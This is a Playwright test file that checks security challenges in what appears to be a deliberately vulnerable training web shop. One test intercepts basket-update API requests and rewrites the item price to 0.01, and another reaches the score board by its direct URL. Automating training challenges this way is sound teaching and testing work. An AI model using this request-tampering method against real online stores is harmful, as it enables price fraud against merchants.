import { test, expect } from '@playwright/test';
import { Navigation } from '../src/utils/navigation';
import { Auth } from '../src/utils/auth';
import { ScoreBoardPage } from '../src/pages/ScoreBoardPage';

test.describe('Security Challenges', () => {
  test('should manipulate basket item price', async ({ page }) => {
    await Auth.loginAsCustomer(page);
    
    const homePage = await Navigation.goToHomePage(page);
    if (!homePage) {
      console.log('Failed to navigate to home page, skipping test');
      test.skip();
      return;
    }
    
    await homePage.searchProduct('apple');
    
    await page.locator('.mat-card').first().click();
    
    await page.locator('#addToBasketButton').click();
    
    await Navigation.goToBasketPage(page);
    
    await page.route('**/api/BasketItems/**', async (route) => {
      const request = route.request();
      
      if (request.method() === 'PUT') {
        const body = JSON.parse(request.postData() || '{}');
        
        body.price = 0.01;
        
        await route.continue({ postData: JSON.stringify(body) });
      } else {
        await route.continue();
      }
    });
    
    await page.locator('mat-cell input').fill('2');
    await page.keyboard.press('Tab'); // Trigger the update
    
    await page.waitForTimeout(1000);
    
    const scoreBoardPage = new ScoreBoardPage(page);
    await scoreBoardPage.navigate();
    
    const isSolved = await scoreBoardPage.isChallengeCompleted('Manipulate Basket');
    expect(isSolved).toBe(true);
  });
  
  test('should access score board by directly navigating to its URL', async ({ page }) => {
    await Navigation.goToScoreBoard(page);
    
    await expect(page).toHaveURL(/.*\/score-board/);
    
    const scoreBoardPage = new ScoreBoardPage(page);
    const totalChallenges = await scoreBoardPage.getTotalChallengesCount();
    
    expect(totalChallenges).toBeGreaterThan(0);
    
    const isSolved = await scoreBoardPage.isChallengeCompleted('Score Board');
    expect(isSolved).toBe(true);
  });
});
